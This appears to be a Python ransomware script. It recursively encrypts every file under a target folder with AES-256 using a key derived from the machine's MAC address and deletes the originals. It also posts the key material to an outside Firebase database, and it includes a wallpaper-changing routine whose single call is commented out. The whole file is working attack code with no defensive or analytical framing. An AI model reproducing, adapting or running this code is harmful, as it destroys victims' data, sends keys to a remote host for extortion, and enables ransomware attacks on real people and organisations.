import crypto
import sys
sys.modules['Crypto'] = crypto
from Cryptodome.Cipher import AES
import os.path
import struct
import hashlib
import ctypes
from uuid import getnode as get_mac
from firebase import firebase

IV_SIZE = 16    # 128 bit, fixed for the AES algorithm
KEY_SIZE = 32   # 256 bit meaning AES-256, can also be 128 or 192 bits
SALT_SIZE = 16  # This size is arbitrary

def enc_file(base, in_filename, out_filename, chunksize=64*1024):
    iv = base[0:IV_SIZE]
    key = base[IV_SIZE:]

    encryptor = AES.new(key, AES.MODE_CFB, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

def search_enc(path):
    try:
        files = os.listdir(path)
        for file in files:
            filename = os.path.join(path, file)
            if(os.path.isdir(filename)):
                search_enc(filename)
            else:
                outfilename = filename + '.enc'
                enc_file(base, filename, outfilename, chunksize=64*1024)
                os.remove(filename)
    except PermissionError:
        pass

def change_bg():
    imagePath = 'C:/Users/tmdgh/Desktop/윾즉2.jpg'
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, imagePath, 3)

testPath = 'C:/Users/tmdgh/Desktop/test124/'

mac = get_mac()
password2 = str(mac)
password = password2.encode()

salt = os.urandom(SALT_SIZE)
base = hashlib.pbkdf2_hmac('sha256', password, salt, 100000, dklen=IV_SIZE + KEY_SIZE)
iv = base[0:IV_SIZE]
key = base[IV_SIZE:]

firebase = firebase.FirebaseApplication('https://keydata-e5fb1.firebaseio.com/', None)
result = firebase.post('/user' + '/' + password2, {"Base" : str(base)})
print(base)
print(str(base))
print(iv)
print(key)

#change_bg()

print("encoding")
search_enc(testPath)